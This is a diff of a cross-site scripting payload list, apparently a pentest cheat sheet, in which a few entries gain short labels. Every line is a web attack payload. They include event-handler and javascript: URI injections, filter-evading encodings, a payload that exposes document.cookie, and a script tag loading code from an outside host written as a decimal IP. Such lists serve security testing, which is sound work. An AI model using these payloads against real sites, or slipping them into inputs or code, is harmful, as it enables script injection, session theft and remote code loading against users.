@@ -1,8 +1,8 @@
-"><img src onerror=alert(1)>
+"><img src onerror=alert(1)> = *DOM XSS
 Function`alert\`xss\````
 "autofocus onfocus=alert(1)//
 </script><script>alert(1)</script>
-<link href=javascript:alert(1) accesskey=k>
+<link href=javascript:alert(1) accesskey=k> 
 <iframe src="javascript:alert(1)%%0D3C--
 <link rel=import href='.&#47"><svg%20onload=alert(domain)>'>
 </</script>script> <</svg>svg/onload=prompt`${document.cookie}`>
@@ -10,7 +10,7 @@ Function`alert\`xss\````
 </script><svg><script>alert(1)%0A-->
 ["</script><script>alert(1)</script>"]=123
 <script src=//3334957647/1>
-javascript&#58alert(document.domain)
+javascript&#58alert(document.domain) = *Javascript execution
 javascript&#x3ax=1;alert(document.domain)
 <embed src="javascript%26%63%6f%6c%6f%6e%3balert()">
 http://top.open`javas\cript:al\ert(1)`
